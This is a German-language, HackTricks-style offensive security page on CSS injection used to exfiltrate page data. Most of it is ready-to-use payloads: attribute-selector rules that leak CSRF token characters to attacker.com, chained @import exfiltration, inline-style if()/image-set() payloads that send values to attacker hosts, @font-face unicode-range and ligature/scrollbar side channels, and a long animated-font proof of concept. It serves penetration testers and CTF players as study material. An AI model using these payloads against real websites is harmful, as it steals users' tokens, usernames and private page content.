# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Attribute Selector

CSS-Selektoren werden so erstellt, dass sie die Werte der `input`-Element-Attribute `name` und `value` abgleichen. Wenn das `value`-Attribut des `input`-Elements mit einem bestimmten Zeichen beginnt, wird eine vordefinierte externe Ressource geladen:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Allerdings stößt dieser Ansatz an eine Grenze, wenn es um versteckte Input-Elemente (`type="hidden"`) geht, da versteckte Elemente keine Hintergründe laden.

#### Umgehung für versteckte Elemente

Um diese Einschränkung zu umgehen, kannst du ein nachfolgendes Geschwisterelement mit dem allgemeinen Geschwisterkombinator `~` ansprechen. Die CSS-Regel gilt dann für alle Geschwister, die dem versteckten Input-Element folgen, wodurch das Hintergrundbild geladen wird:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Voraussetzungen für CSS Injection

For the CSS Injection technique to be effective, certain conditions must be met:

1. **Payload Length**: Der CSS Injection-Vektor muss ausreichend lange Payloads unterstützen, um die konstruierten Selektoren aufzunehmen.
2. **CSS Re-evaluation**: Du solltest die Möglichkeit haben, die Seite zu framen, was notwendig ist, um die erneute Auswertung von CSS mit neu generierten Payloads auszulösen.
3. **Externe Ressourcen**: Die Technik setzt voraus, dass extern gehostete Bilder verwendet werden können. Das kann durch die Content Security Policy (CSP) der Seite eingeschränkt sein.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no idea what is inside the web page loading the CSS injection.\
It's also possible to use those selectors to extract information from several block of the same type like in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Combining this with the following **@import** technique, it's possible to exfiltrate a lot of **info using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Die vorherige Technik hat einige Nachteile — siehe die prerequisites. Entweder musst du in der Lage sein, **mehrere Links an das victim zu senden**, oder du musst die **iframe**-Fähigkeit für die CSS injection verwundbare Seite haben.

Es gibt jedoch eine andere clevere Technik, die **CSS `@import`** verwendet, um die Qualität der Methode zu verbessern.

Dies wurde zuerst von [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) gezeigt und funktioniert wie folgt:

Anstatt dieselbe Seite immer wieder zu laden und jedes Mal dutzende verschiedene payloads einzusetzen (wie bei der vorherigen Methode), werden wir die Seite nur einmal laden und sie nur mit einem Import zum attackers server laden (das ist das payload, das an das victim gesendet wird):
```css
@import url("//attacker.com:5001/start?");
```
1. Das Import wird **einige CSS-Skripte vom Angreifer erhalten** und der **Browser wird sie laden**.
2. Der erste Teil des vom Angreifer gesendeten CSS-Skripts ist **ein weiteres `@import` zum Server des Angreifers.**
1. Der Server des Angreifers wird auf diese Anfrage noch nicht antworten, da wir zuerst ein paar Zeichen leak-en und dann dieses import mit dem Payload beantworten wollen, um die nächsten zu leak-en.
3. Der zweite und größere Teil des Payloads ist ein **Attribute-Selector-Leakage-Payload**
1. Dies wird an den Server des Angreifers das **erste Zeichen des Secrets und das letzte** senden
4. Sobald der Server des Angreifers das **erste und letzte Zeichen des Secrets** erhalten hat, wird er **das in Schritt 2 angeforderte import beantworten**.
1. Die Antwort wird genau dieselbe Struktur wie **Schritte 2, 3 und 4** haben, aber dieses Mal wird versucht, **das zweite Zeichen des Secrets und dann das vorletzte** zu finden.

Der Angreifer wird **dieser Schleife folgen, bis es ihm gelingt, das Secret vollständig zu leak-en**.

Du findest das Original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) oder du findest fast denselben [**same code but commented here**.](#css-injection)

> [!TIP]
> Das Script wird versuchen, jedes Mal 2 Zeichen zu entdecken (vom Anfang und vom Ende), weil der Attribute-Selector Dinge wie erlaubt:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> Das erlaubt dem Script, das Secret schneller zu leak-en.

> [!WARNING]
> Manchmal erkennt das Script **nicht korrekt, dass das entdeckte Präfix + Suffix bereits die komplette flag ist** und es wird im Vorwärtsbereich (Präfix) und Rückwärtsbereich (Suffix) weiterlaufen und sich irgendwann aufhängen.\
> Keine Sorge, überprüfe einfach die **Ausgabe**, denn **du kannst die flag dort sehen**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: kontrolliere das style-Attribut eines Elements und stelle sicher, dass das Zielattribut auf demselben Element ist (attr() liest nur Attributes desselben Elements).
- Read: kopiere das Attribut in eine CSS-Variable: `--val: attr(title)`.
- Decide: wähle eine URL mit verschachtelten Conditionals, die die Variable mit String-Kandidaten vergleichen: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: wende `background: image-set(var(--steal))` (oder eine andere fetchende Eigenschaft) an, um eine Anfrage an den gewählten Endpoint zu erzwingen.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
Funktionierender Payload (für den Vergleich sind doppelte Anführungszeichen erforderlich):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
Auflisten von Attributwerten mit verschachtelten Bedingungen:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Realistische Demo (Benutzernamen abfragen):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Hinweise und Einschränkungen:

- Funktioniert zum Zeitpunkt der Recherche in Chromium-basierten Browsern; das Verhalten kann in anderen Engines abweichen.
- Am besten geeignet für endliche/aufzählbare Wertebereiche (IDs, flags, kurze Benutzernamen). Das Stehlen beliebig langer Zeichenketten ohne externe Stylesheets bleibt schwierig.
- Jede CSS-Eigenschaft, die eine URL abruft, kann verwendet werden, um die Anfrage auszulösen (z. B. background/image-set, border-image, list-style, cursor, content).

Automatisierung: eine Burp Custom Action kann verschachtelte inline-style Payloads erzeugen, um Attributwerte per brute-force zu ermitteln: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Andere Selektoren

Weitere Möglichkeiten, auf Teile des DOM mit **CSS selectors** zuzugreifen:

- **`.class-to-search:nth-child(2)`**: Sucht das zweite Element mit der Klasse "class-to-search" im DOM.
- **`:empty`** selector: Wird zum Beispiel in [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Fehlerbasierte XS-Search

**Referenz:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Das übergeordnete Ziel ist, **eine benutzerdefinierte Schriftart von einem kontrollierten Endpoint zu verwenden** und sicherzustellen, dass **Text (in diesem Fall 'A') nur mit dieser Schriftart angezeigt wird, wenn die angegebene Ressource (`favicon.ico`) nicht geladen werden kann**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Verwendung einer benutzerdefinierten Schriftart**:

- Eine benutzerdefinierte Schriftart wird mit der `@font-face`-Regel innerhalb eines `<style>`-Tags im `<head>`-Abschnitt definiert.
- Die Schriftart heißt `poc` und wird von einem externen Endpunkt (`http://attacker.com/?leak`) geladen.
- Die Eigenschaft `unicode-range` ist auf `U+0041` gesetzt und zielt auf das Unicode-Zeichen 'A' ab.

2. **Object-Element mit Fallback-Text**:
- Ein `<object>`-Element mit `id="poc0"` wird im `<body>`-Abschnitt erstellt. Dieses Element versucht, eine Ressource von `http://192.168.0.1/favicon.ico` zu laden.
- Die `font-family` für dieses Element ist auf `'poc'` gesetzt, wie im `<style>`-Abschnitt definiert.
- Wenn die Ressource (`favicon.ico`) nicht geladen werden kann, wird der Fallback-Inhalt (der Buchstabe 'A') innerhalb des `<object>`-Tags angezeigt.
- Der Fallback-Inhalt ('A') wird mit der benutzerdefinierten Schriftart `poc` gerendert, falls die externe Ressource nicht geladen werden kann.

### Styling des Scroll-to-Text Fragment

Die Pseudo-Klasse **`:target`** wird verwendet, um ein Element auszuwählen, das durch ein **URL fragment** angesprochen wird, wie in der [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo) angegeben. Es ist wichtig zu verstehen, dass `::target-text` kein Element auswählt, sofern der Text nicht explizit durch das Fragment adressiert wird.

Ein Sicherheitsproblem entsteht, wenn Angreifer die **Scroll-to-text**-Fragment-Funktion ausnutzen, wodurch sie das Vorhandensein eines bestimmten Textes auf einer Webseite bestätigen können, indem sie durch HTML injection eine Ressource von ihrem Server laden. Die Methode beinhaltet das Injizieren einer CSS-Regel wie diese:
```css
:target::before {
content: url(target.png);
}
```
In solchen Szenarien wird, wenn der Text "Administrator" auf der Seite vorhanden ist, die Ressource `target.png` vom Server angefordert, was auf das Vorhandensein des Textes hinweist. Ein Beispiel für diesen Angriff kann über eine speziell gestaltete URL ausgeführt werden, die das injizierte CSS zusammen mit einem Scroll-to-text fragment einbettet:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Hier manipuliert der Angriff HTML injection, um den CSS-Code zu übertragen, und zielt dabei mittels des Scroll-to-text fragment (`#:~:text=Administrator`) auf den spezifischen Text "Administrator". Wird der Text gefunden, wird die angegebene Ressource geladen und signalisiert unbeabsichtigt deren Präsenz dem Angreifer.

Zur Abmilderung sollten folgende Punkte beachtet werden:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) ist so konzipiert, dass es nur Wörter oder Sätze abgleicht, wodurch seine Fähigkeit eingeschränkt ist, beliebige secrets oder tokens zu leaken.
2. **Restriction to Top-level Browsing Contexts**: STTF funktioniert ausschließlich in top-level browsing contexts und nicht innerhalb von iframes, wodurch jeder Exploit-Versuch für den Nutzer auffälliger wird.
3. **Necessity of User Activation**: STTF erfordert eine Benutzeraktivierungsgeste, um zu funktionieren, das heißt Ausnutzungen sind nur über vom Nutzer initiierte Navigationsvorgänge möglich. Diese Voraussetzung mindert erheblich das Risiko, dass Angriffe ohne Benutzerinteraktion automatisiert werden. Der Autor des Blogposts weist jedoch auf bestimmte Bedingungen und Bypässe hin (z. B. social engineering, Interaktion mit weit verbreiteten Browser-Erweiterungen), die die Automatisierung des Angriffs erleichtern könnten.

Bewusstsein für diese Mechanismen und potenzielle Schwachstellen ist entscheidend, um Web‑Sicherheit zu erhalten und sich gegen solche ausbeuterischen Taktiken zu schützen.

Für mehr Informationen siehe den Originalbericht: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Sie können sich einen [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb) ansehen.

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Sie können **externe Fonts für bestimmte Unicode‑Werte** angeben, die nur dann **geladen werden, wenn diese Unicode‑Werte auf der Seite vorhanden sind**. Zum Beispiel:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Die beschriebene Technik beinhaltet das Extrahieren von Text aus einem Node durch Ausnutzen von font ligatures und das Überwachen von Breitenänderungen. Der Prozess umfasst mehrere Schritte:

1. **Creation of Custom Fonts**:

- SVG fonts werden mit Glyphen erstellt, die ein `horiz-adv-x` Attribut besitzen, welches eine große Breite für eine Glyphe setzt, die eine zwei-Zeichen-Sequenz repräsentiert.
- Beispiel SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, wobei "XY" eine zwei-Zeichen-Sequenz bezeichnet.
- Diese Fonts werden dann mit fontforge in das woff-Format konvertiert.

2. **Detection of Width Changes**:

- CSS wird verwendet, um sicherzustellen, dass Text nicht umgebrochen wird (`white-space: nowrap`) und um das Scrollbar-Design anzupassen.
- Das Erscheinen einer horizontalen scrollbar, die unterschiedlich gestylt ist, dient als Indikator (oracle), dass eine bestimmte ligature und damit eine bestimmte Zeichenfolge im Text vorhanden ist.
- Der verwendete CSS-Code:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: Fonts werden für Paare von Zeichen mit großer Breite erstellt.
- **Step 2**: Ein scrollbar-basiertes Trick wird eingesetzt, um zu erkennen, wann die breit-glyphe (ligature für ein Zeichenpaar) gerendert wird, was auf das Vorhandensein der Zeichenfolge hinweist.
- **Step 3**: Beim Erkennen einer ligature werden neue Glyphen erzeugt, die Dreizeichen-Sequenzen repräsentieren, indem das erkannte Paar verwendet und ein vorangestelltes oder nachgestelltes Zeichen hinzugefügt wird.
- **Step 4**: Die Erkennung der Dreizeichen-ligature wird durchgeführt.
- **Step 5**: Der Prozess wiederholt sich und offenbart schrittweise den gesamten Text.

4. **Optimization**:
- Die aktuelle Initialisierungsmethode mit `<meta refresh=...` ist nicht optimal.
- Eine effizientere Methode könnte den CSS `@import` Trick verwenden, wodurch die Performance des Exploits verbessert wird.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Dieser Trick wurde in diesem [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/) veröffentlicht. Der in einem Textknoten verwendete charset kann mit den im Browser installierten default fonts leaked werden: es werden keine externen oder custom Fonts benötigt.

Das Konzept basiert auf einer Animation, die die Breite eines `div` schrittweise vergrößert, wodurch ein Zeichen nach dem anderen vom 'suffix'-Teil des Textes in den 'prefix'-Teil übergeht. Dieser Prozess teilt den Text effektiv in zwei Abschnitte:

1. **Prefix**: die initiale Zeile.
2. **Suffix**: die nachfolgende(n) Zeile(n).

Die Übergangsphasen der Zeichen würden wie folgt erscheinen:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Während dieser Übergangsphase wird der unicode-range trick verwendet, um jedes neue Zeichen zu identifizieren, sobald es dem prefix beitritt. Dies wird erreicht, indem die Schriftart auf Comic Sans umgeschaltet wird, die deutlich höher ist als die default font und dadurch eine vertikale scrollbar auslöst. Das Erscheinen dieser scrollbar offenbart indirekt das Vorhandensein eines neuen Zeichens im prefix.

Obwohl diese Methode die Erkennung einzigartiger Zeichen beim Auftreten erlaubt, gibt sie nicht an, welches Zeichen wiederholt auftritt, sondern nur, dass eine Wiederholung stattgefunden hat.

> [!TIP]
> Grundsätzlich wird der **unicode-range** verwendet, um ein **char** zu detektieren, aber da wir kein externes Font laden wollen, müssen wir einen anderen Weg finden.\
> Wenn das **char** **gefunden** wird, bekommt es die vorinstallierte **Comic Sans**-Font, die das **char** **größer** macht und eine scroll bar auslöst, welche das gefundene **char** leaked.

Siehe den aus dem PoC extrahierten Code:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset mit einer Standard-Schriftart durch Verstecken von Elementen (erfordert keine externen Assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** Dies wird als [eine erfolglose Lösung in diesem writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) erwähnt

Dieser Fall ist dem vorherigen sehr ähnlich. Hier besteht das Ziel darin, bestimmte **Zeichen größer als andere zu machen, um etwas zu verbergen**, etwa einen Button, damit er nicht vom Bot gedrückt wird, oder ein Bild, das nicht geladen wird. Dadurch können wir die Aktion (oder das Ausbleiben der Aktion) messen und feststellen, ob ein bestimmtes Zeichen im Text vorhanden ist.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** Dies wird als [eine erfolglose Lösung in diesem writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) erwähnt

In diesem Fall könnten wir versuchen zu leaken, ob ein Zeichen im Text vorkommt, indem wir eine gefälschte Schriftart vom gleichen Origin laden:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Wenn es eine Übereinstimmung gibt, wird die **font von `/static/bootstrap.min.css?q=1` geladen**. Auch wenn sie nicht erfolgreich geladen wird, sollte der **Browser sie cachen**, und selbst wenn kein Cache vorhanden ist, gibt es den **304 not modified**-Mechanismus, sodass die **Antwort schneller** als andere Dinge sein sollte.

Wenn der Zeitunterschied der gecachten Antwort zur nicht-gecacheten nicht groß genug ist, ist das nicht nützlich. Zum Beispiel erwähnte der Autor: Nachdem ich getestet habe, stellte ich fest, dass das erste Problem ist, dass die Geschwindigkeit nicht viel anders ist, und das zweite Problem ist, dass der Bot das Flag `disk-cache-size=1` verwendet, was sehr durchdacht ist.

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** Dies wird als [eine erfolglose Lösung in diesem Writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) erwähnt

In diesem Fall kannst du **CSS angeben, das Hunderte falscher "fonts"** aus derselben Origin lädt, wenn eine Übereinstimmung auftritt. Auf diese Weise kannst du die **Zeit messen**, die benötigt wird, und herausfinden, ob ein Zeichen erscheint oder nicht, mit etwas wie:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Und der Code des Bots sieht so aus:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Also, wenn die font nicht übereinstimmt, wird die Antwortzeit beim Aufrufen des bot voraussichtlich etwa 30 Sekunden betragen. Wenn jedoch eine Schriftart-Übereinstimmung vorliegt, werden mehrere requests gesendet, um die Schriftart abzurufen, wodurch das Netzwerk kontinuierlich aktiv bleibt. Infolgedessen dauert es länger, die Stop-Bedingung zu erfüllen und die Antwort zu erhalten. Daher kann die Antwortzeit als Indikator verwendet werden, um festzustellen, ob eine Schriftart-Übereinstimmung vorliegt.

## Referenzen

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
